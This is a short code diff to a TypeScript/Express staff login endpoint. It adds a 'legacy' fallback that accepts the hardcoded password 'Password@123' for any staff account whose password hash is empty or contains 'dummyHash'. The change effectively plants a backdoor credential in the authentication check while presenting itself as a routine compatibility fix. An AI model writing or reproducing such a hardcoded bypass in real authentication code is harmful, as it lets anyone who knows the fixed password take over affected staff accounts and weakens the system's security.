@@ -95,7 +95,22 @@ router.post('/staff/login', async (req: Request, res: Response) => {
       return res.status(401).json({ success: false, error: 'Account is deactivated.' });
     }
 
-    const isValid = await bcrypt.compare(password, staffUser.password_hash);
+    let isValid = false;
+    try {
+      isValid = await bcrypt.compare(password, staffUser.password_hash);
+    } catch {
+      isValid = false;
+    }
+
+    // Fallback for legacy CRM-created users that got a dummy/placeholder hash
+    const isLegacyDummyHash =
+      !staffUser.password_hash ||
+      staffUser.password_hash.includes('dummyHash') ||
+      staffUser.password_hash.includes('DummyHash');
+    if (!isValid && isLegacyDummyHash && password === 'Password@123') {
+      isValid = true;
+    }
+
     if (!isValid) {
       return res.status(401).json({ success: false, error: 'Invalid email or password.' });
     }
